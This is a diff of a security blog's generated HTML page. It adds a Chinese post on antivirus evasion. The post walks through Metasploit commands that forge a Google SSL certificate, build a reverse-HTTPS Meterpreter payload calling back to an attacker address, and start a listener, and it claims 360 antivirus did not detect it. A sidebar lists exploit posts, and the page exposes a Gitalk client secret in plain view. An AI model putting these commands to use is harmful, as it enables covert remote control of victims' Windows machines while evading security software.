@@ -66,6 +66,72 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-httpsms" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/17/httpsms/" class="article-date">
+  <time datetime="2020-11-17T10:00:38.000Z" itemprop="datePublished">2020-11-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/17/httpsms/">httpsms</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#https证书绕过杀软<br><strong>msf生成证书（要能连上google，用俺vps来搞）</strong><br>use auxiliary/gather/impersonate_ssl</p>
+<p>set RHOST <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
+<p>run<br><img src="https://s1.ax1x.com/2017/10/17/JOAmV.png" alt="enter image description here"><br>生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py<br>然后msf监听：</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/reverse_winhttps</p>
+<p>set LHOST 192.168.226.136</p>
+<p>set LPORT 443</p>
+<p>set HandlerSSLCert /root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> (设置证书)</p>
+<p>set StagerVerifySSLCert true</p>
+<p>exploit -j</p>
+<p>然后在win7上运行这个pentestlab.py<br><img src="https://s1.ax1x.com/2017/10/17/JOEwT.png" alt="enter image description here"></p>
+<p>360杀毒，安全卫士无反应。</p>
+<p>全自动工具：<a target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/category/defense-evasion/">https://pentestlab.blog/category/defense-evasion/</a></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2020/11/17/httpsms/" data-id="ckm1xdls40006h6cp4qfd978y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-cms漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -110,7 +176,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" data-id="ckm1vynxg00048scp334efj9v" class="article-share-link">Share</a>
+      <a data-url="http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" data-id="ckm1xdls20004h6cpgsya9huf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -164,7 +230,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2020/11/17/about/" data-id="ckm1vynxf00038scp20rk94o3" class="article-share-link">Share</a>
+      <a data-url="http://bo.vuvhz.top/2020/11/17/about/" data-id="ckm1xdls20003h6cpcbr55bh7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -210,7 +276,11 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
-            <a href="/2021/03/09/%E9%94%90%E6%8D%B7RG-UAC/">(no title)</a>
+            <a href="/2021/03/09/phpstudy%E5%90%8E%E9%97%A8/">phpstudy后门</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/09/%E9%94%90%E6%8D%B7RG-UAC/">锐捷RG-UAC</a>
           </li>
         
           <li>
@@ -218,15 +288,11 @@ gitalk.render('gitalk-container')
           </li>
         
           <li>
-            <a href="/2021/03/07/CVE-2021-21972/">CVE-2021-21972 Vmware vCenter 图形化POC批量扫描工具</a>
+            <a href="/2021/03/07/CVE-2021-21972/">CVE-2021-21972</a>
           </li>
         
           <li>
             <a href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/">通达OAv11.7在线用户登录漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/">Appscan_10.0.4破解版</a>
           </li>
         
       </ul>
